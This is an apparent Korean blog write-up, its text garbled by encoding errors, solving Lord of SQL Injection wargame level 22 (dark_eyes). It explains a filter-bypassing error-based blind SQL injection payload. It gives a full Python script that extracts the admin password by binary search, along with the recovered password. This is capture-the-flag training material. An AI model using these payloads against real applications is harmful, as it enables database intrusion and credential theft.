---
title: LOS - 22ë²ˆ dark_eyes
category: Lord of SQL Injection
---

# [22] dark_eyes

## ë¬¸ì œ
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FQZVKB%2FbtrnR2UVQMP%2FtzRVYHPoeR2N10uYesKs8k%2Fimg.png">

## í’€ì´

ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” col, if, case, when, sleep, benchmarkë¥¼ í•„í„°ë§í•˜ê³  ìˆë‹¤.

 

ì „ì²´ì ì¸ êµ¬ì¡°ëŠ” ì´ì „ ë¬¸ì œì™€ í¬ê²Œ ë‹¤ë¥´ì§€ ì•Šì€ Error Based Blind SQLi ë¬¸ì œì´ë‹¤.

* ì´ì „ ë¬¸ì œì™€ëŠ” ë‹¬ë¦¬ ì—ëŸ¬ê°€ ë°œìƒí•  ì‹œ ì—ëŸ¬ ë©”ì‹œì§€ë¥¼ ë³´ì—¬ì£¼ì§€ëŠ” ì•Šì§€ë§Œ exitë¨ìœ¼ë¡œ ì¸í•´ ë¹ˆ í™”ë©´ì´ ì¶œë ¥ë˜ë¯€ë¡œ ê·¸ ìì²´ë¡œ ì—ëŸ¬ ì—¬ë¶€ íŒë³„ì´ ê°€ëŠ¥í•˜ë‹¤.

 

ì´ë²ˆ ë¬¸ì œì˜ í•µì‹¬ì€ ifë¬¸ì´ë‚˜ caseë¬¸ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  íŠ¹ì • ì¡°ê±´ì„ ì¶©ì¡±í•˜ëŠ” ê²½ìš°ì— ì—ëŸ¬ë¥¼ ë°œìƒì‹œì¼œì£¼ëŠ” ê²ƒì— ìˆë‹¤.

 

ì´ë˜ì €ë˜ ëŒ€ì²´í•  ë°©ë²•ì„ ì°¾ì•„ë´¤ì§€ë§Œ... ë°©ë²•ì€ ë”± í•˜ë‚˜ì¸ ê²ƒ ê°™ì•˜ë‹¤.

ì„œë¸Œì¿¼ë¦¬ë¥¼ ì´ìš©í•˜ëŠ” ê²ƒì´ë‹¤.

 

ì‚¬ìš©í•  í˜ì´ë¡œë“œì˜ ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```python
param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id='admin' and length(pw)={num}) %23"
```

â‘  SELECT 1 UNION SELECT 2

â‡’ ì„œë¸Œì¿¼ë¦¬ê°€ ë‘˜ ì´ìƒì˜ rowë¥¼ ë°˜í™˜í•˜ì§€ ëª»í•œë‹¤ëŠ” íŠ¹ì„±ì„ ì´ìš©í•˜ì—¬, í•´ë‹¹ ìš”ì†Œê°€ ì‹¤í–‰ë  ì‹œ ì—ëŸ¬ê°€ ë°œìƒí•˜ê²Œë” ìœ ë„í•œë‹¤.

â‘¡ where id='admin' and length(pw)={num}

â‡’ pwì˜ ê¸¸ì´ê°€ ì¼ì¹˜í•  ì‹œ whereì ˆì´ Trueê°€ ë˜ë¯€ë¡œ â‘ ë²ˆ ìš”ì†Œê°€ ì‹¤í–‰ë˜ê³ , ê·¸ë¡œ ì¸í•œ ì—ëŸ¬ê°€ ë°œìƒí•˜ê²Œ ëœë‹¤.

â‡’ ì—ëŸ¬ì˜ ë°œìƒ ìœ ë¬´ë¥¼ íŒë³„í•˜ì—¬ pwì˜ ê¸¸ì´ì™€ ì¼ì¹˜í•˜ëŠ” numì„ ì°¾ì•„ë‚¼ ìˆ˜ ìˆë‹¤.

 

ì´í›„ ì™„ì „í•œ pwë¥¼ ì°¾ëŠ” ë°©ë²•ë„ ë™ì¼í•œ ë¡œì§ì„ ì‚¬ìš©í•œë‹¤.

ë˜í•œ ì´ì „ ë¬¸ì œë“¤ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ, 2ì§„ íƒìƒ‰ì„ ì ìš©í•˜ì—¬ ê²€ìƒ‰ ì†ë„ë¥¼ ë†’ì¸ë‹¤.

 

 

LoS 22ë²ˆ Python ìë™í™” ì½”ë“œì´ë‹¤.

```python
import requests

def send(param):
    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("ğŸ’˜ LoS 21ì„ ì‹œì‘í•©ë‹ˆë‹¤")

for num in range(0,100):
    param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id='admin' and length(pw)={num}) %23"
    if("query" not in send(param)):
        print(f"ğŸ‘ pwì˜ ê¸¸ì´ëŠ” {num}ì…ë‹ˆë‹¤!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id=\"admin\" and ascii(substr(pw,{len},1))>={middle}) %23"
        if("query" not in send(param)):
            param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id=\"admin\" and ascii(substr(pw,{len},1))={middle}) %23"
            if("query" not in send(param)):
                print(f"{len}ë²ˆì§¸ ë¬¸ì â†’ {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"ğŸ‘ pwì˜ ì •ì²´ëŠ” [{ans}]ì…ë‹ˆë‹¤!")
```

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcDNwU8%2FbtrnLHEJjIe%2FQayaMUVXj93KSZTUwujn3K%2Fimg.png">


Blind ê³µê²© ê²°ê³¼, pwëŠ” `5a2f5d3c` ì„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

## ê²°ê³¼
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FobIoV%2FbtrnN22UR9z%2FWb6jsJDojQmhcK1tCizpUk%2Fimg.png">